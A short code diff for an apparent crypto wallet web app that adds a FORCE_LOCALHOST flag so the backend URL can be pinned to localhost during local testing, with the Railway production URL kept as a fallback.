@@ -28,10 +28,16 @@ import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
 
-// 🌐 BACKEND URL CONFIGURATION (Auto-detects Development vs Production)
-const BACKEND_URL = process.env.NODE_ENV === 'production' 
-  ? 'https://salvation-server-gp-production.up.railway.app' 
-  : 'http://localhost:3001';
+// 🌐 BACKEND URL CONFIGURATION
+// Set to true to FORCE localhost for local testing.
+// Set to false to let it automatically detect Production vs Development.
+const FORCE_LOCALHOST = true; 
+
+const BACKEND_URL = FORCE_LOCALHOST 
+  ? 'http://localhost:3001' 
+  : (process.env.NODE_ENV === 'production' 
+      ? 'https://salvation-server-gp-production.up.railway.app' 
+      : 'http://localhost:3001');
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
